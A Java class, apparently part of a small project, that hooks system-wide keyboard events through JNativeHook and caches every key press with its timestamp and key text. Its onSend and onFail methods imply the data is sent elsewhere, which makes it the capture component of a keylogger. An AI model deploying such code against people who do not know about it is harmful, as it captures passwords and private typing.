package org.nick.keys;

import java.util.ArrayList;
import java.util.List;

import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;
import org.nick.handlers.KeyStorage;

/**
 * 
 * @author NICK
 * This class will be responsible to cache key strokes
 * @param keyCache is used to store the keystrokes
 */
public class NativeKeyboard implements NativeKeyListener{

	private List<KeyStorage> keyCache = new ArrayList<>();
	
	public List<KeyStorage> getKeyCache() {
		return keyCache;
	}

	public void setKeyCache(List<KeyStorage> keyCache) {
		this.keyCache = keyCache;
	}

	@Override
	public void nativeKeyPressed(NativeKeyEvent e) {
		keyCache.add(new KeyStorage(e.getKeyCode(), true, System.currentTimeMillis(), e.getKeyText(e.getKeyCode())));
		
	}

	@Override
	public void nativeKeyReleased(NativeKeyEvent e) {
	//	keyCache.add(new KeyStorage(e.getKeyCode(), false, System.currentTimeMillis(), e.getKeyText(e.getKeyCode())));
		
	}

	@Override
	public void nativeKeyTyped(NativeKeyEvent e) {
		// TODO Auto-generated method stub
		
	}
	
	public void onSend() {
		keyCache.clear(); //clears the cached keystrokes when sent
	}
	
	public void onFail() {
		System.out.println("KeyStroke data  failed to be sent");
	}

}
